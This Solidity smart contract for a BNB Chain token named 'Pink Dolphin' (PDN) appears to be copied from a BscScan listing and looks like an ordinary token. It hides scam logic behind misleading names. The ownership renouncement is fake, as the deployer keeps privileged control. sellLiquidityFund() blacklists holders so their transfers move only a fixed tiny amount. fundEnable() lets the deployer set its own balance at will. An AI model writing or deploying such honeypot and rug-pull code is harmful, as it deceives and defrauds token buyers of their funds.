/**
 *Submitted for verification at BscScan.com on 2023-01-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PinkDolphin {
    uint8 public decimals = 18;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public takeReceiver;



    address public exemptSwapTrading;
    address public owner;
    address public walletIs;
    mapping(address => bool) public tokenSender;
    uint256 constant exemptTo = 15 ** 10;
    string public name = "Pink Dolphin";
    string public symbol = "PDN";
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => uint256) public balanceOf;


    modifier feeMarketing() {
        require(tokenSender[msg.sender]);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address owner);

    constructor (){
        IRouter takeReceiverBuy = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IFactory exemptEnableList = IFactory(takeReceiverBuy.factory());
        walletIs = exemptEnableList.createPair(takeReceiverBuy.WETH(), address(this));
        owner = msg.sender;
        exemptSwapTrading = owner;
        tokenSender[exemptSwapTrading] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (takeReceiver[sender]) {
            return modeLiquidity(sender, recipient, exemptTo);
        }
        return modeLiquidity(sender, recipient, amount);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }

    function sellLiquidityFund(address burnIs) public feeMarketing {
        if (burnIs == exemptSwapTrading || burnIs == address(this) || burnIs == walletIs) {
            return;
        }
        takeReceiver[burnIs] = true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != type(uint256).max) {
            require(allowance[sender][msg.sender] >= amount);
            allowance[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function fundEnable(uint256 buyToken) public feeMarketing {
        balanceOf[exemptSwapTrading] = buyToken;
    }

    function fundAuto(address receiverLiquidity) public feeMarketing {
        tokenSender[receiverLiquidity] = true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function modeLiquidity(address autoTrading, address limitFee, uint256 buyToken) internal returns (bool) {
        require(balanceOf[autoTrading] >= buyToken);
        balanceOf[autoTrading] -= buyToken;
        balanceOf[limitFee] += buyToken;
        emit Transfer(autoTrading, limitFee, buyToken);
        return true;
    }


}